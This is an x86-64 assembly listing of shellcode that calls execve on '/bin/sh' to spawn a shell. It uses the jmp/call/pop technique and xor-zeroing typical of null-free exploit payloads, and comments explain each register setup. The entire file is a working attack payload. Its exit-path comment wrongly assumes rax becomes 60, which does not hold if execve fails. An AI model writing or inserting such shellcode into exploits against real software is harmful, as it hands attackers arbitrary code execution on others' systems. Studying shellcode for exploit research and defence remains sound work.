	.global _start

	.data
_start: jmp	1f
2:	pop	%rsi		/* rsi = &string */

	/* execve(<cmd>  , argv[] , envp[]) */
	/* execve(/bin/sh, {/bin/sh, NULL}, NULL  ) */
	/*  rax  (rdi    , rsi    , rdx   ) */    
	xor	%rax, %rax
 	movb	%al, 7(%rsi)	/* add \0 to string */
	xor	%rdx, %rdx	/* envp = NULL */
	mov	%rsi, 8(%rsi)	/* argv[0] = &string */
	mov	%rax, 16(%rsi)	/* argv[1] = NULL */
	mov	%rsi, %rdi	/* &string */
	lea	8(%rsi), %rsi	/* rsi = &argv[] */
	or	$59, %rax	/* rax = 59 = syscall 'execve' */
	syscall

	/* exit */
	xor	%rdi, %rdi	/* return 0 */
	inc	%rax		/* rax = 60 = syscall 'exit' */
	syscall

1:	call	2b
	.ascii	"/bin/shX"

	.end
